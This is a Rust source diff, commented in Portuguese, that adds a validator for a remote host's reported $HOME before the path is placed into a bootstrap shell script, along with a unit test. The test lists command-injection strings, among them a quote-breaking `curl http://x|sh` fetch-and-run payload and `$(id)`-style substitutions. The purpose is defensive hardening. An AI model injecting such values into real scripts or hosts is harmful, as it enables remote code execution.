@@ -202,6 +202,49 @@ pub fn valid_opcao(o: &str) -> Result<(), String> {
     Ok(())
 }
 
+/// Valida o `$HOME` que o HOST informou, antes de ele virar caminho no script de bootstrap.
+///
+/// **O quê:** exige caminho absoluto POSIX, ASCII, com teto, e recusa aspas, `$`, crase, `;`
+/// e afins. **Onde:** `bootstrap::instalar`, sobre `Sondagem::home`.
+///
+/// **Por que existe:** este é o único valor do módulo que vem de FORA e vai parar numa linha
+/// de comando — e vinha sem validação nenhuma. Todo campo do perfil (alias, host, usuário,
+/// chave, `-o`) passa por um validador porque cai no argv do `ssh`; o `home` cai no SCRIPT
+/// que o `sh` do host interpreta, o que é a mesma coisa com uma camada a mais.
+///
+/// No `script_de_instalacao` ele é interpolado dentro de aspas SIMPLES (`mkdir -p '{dir}'`).
+/// Um `'` no valor fecha a citação e o resto da linha vira comando. Quem fornece o valor é o
+/// próprio servidor, então o alcance é o host que já o forneceu — não há salto pra máquina
+/// de quem roda o app, e `sond.home` não é usado em mais lugar nenhum (conferido). Não é,
+/// portanto, escalada de privilégio.
+///
+/// **Ainda assim vale barrar**, por três motivos. No caminho `OpsShellRoot` o texto injetado
+/// fica encostado num `sudo -n` — e "encostado no sudo" é coisa que não se quer ter de
+/// reanalisar a cada refatoração. É a única exceção num módulo que valida todo o resto, e
+/// exceção sem motivo escrito é o que vira precedente. E a validação custa dez linhas.
+pub fn valid_home_remoto(h: &str) -> Result<(), String> {
+    let ruim = |porque: &str| {
+        Err(format!(
+            "o host informou um $HOME que não dá pra usar ({porque}): {:?}. \
+             Ele entra no script de instalação, então só aceito caminho absoluto simples.",
+            resumir(h)
+        ))
+    };
+    if h.is_empty() || h.len() > 256 {
+        return ruim("vazio ou longo demais");
+    }
+    if !h.starts_with('/') {
+        return ruim("não é absoluto");
+    }
+    if h.contains("..") {
+        return ruim("contém `..`");
+    }
+    if !h.chars().all(|c| c.is_ascii_alphanumeric() || "/._-".contains(c)) {
+        return ruim("tem caractere fora de [A-Za-z0-9/._-]");
+    }
+    Ok(())
+}
+
 /// Encurta um valor para aparecer numa mensagem de erro.
 ///
 /// Sem isto, `alias de VPS inválido: {alias:?}` com um alias de 300 MB devolvia uma mensagem de
@@ -432,6 +475,37 @@ fn linha_para_perfil(r: &rusqlite::Row) -> rusqlite::Result<VpsProfile> {
 mod tests {
     use super::*;
     use crate::vps::db_de_teste;
+
+    /// O `$HOME` que o host informa vira caminho no script de bootstrap — e o script é
+    /// interpretado por um `sh` do outro lado. Quebra de citação morre antes de virar texto.
+    #[test]
+    fn home_do_host_hostil_e_recusado() {
+        for veneno in [
+            // Fecha a aspa simples de `mkdir -p '{dir}'` e emenda comando.
+            "/home/d'; curl http://x|sh; echo '",
+            "/home/d\"; id; \"",
+            "/home/d`id`",
+            "/home/d$(id)",
+            "/home/d;id",
+            "/home/d|id",
+            "/home/d\nid",
+            "/home/../../etc",
+            "relativo/sem/barra",
+            "",
+        ] {
+            assert!(
+                valid_home_remoto(veneno).is_err(),
+                "$HOME hostil tinha que ser recusado: {veneno:?}"
+            );
+        }
+        // Acima do teto de 256.
+        assert!(valid_home_remoto(&format!("/{}", "a".repeat(256))).is_err());
+
+        // E o legítimo continua passando — inclusive os formatos de BSD e macOS.
+        for ok in ["/home/deploy", "/root", "/Users/ana", "/usr/home/bsd", "/home/a.b_c-d"] {
+            assert!(valid_home_remoto(ok).is_ok(), "$HOME legítimo recusado: {ok:?}");
+        }
+    }
 
     fn conn_de_teste(nome: &str) -> Connection {
         db::open_at(&db_de_teste(nome)).unwrap()
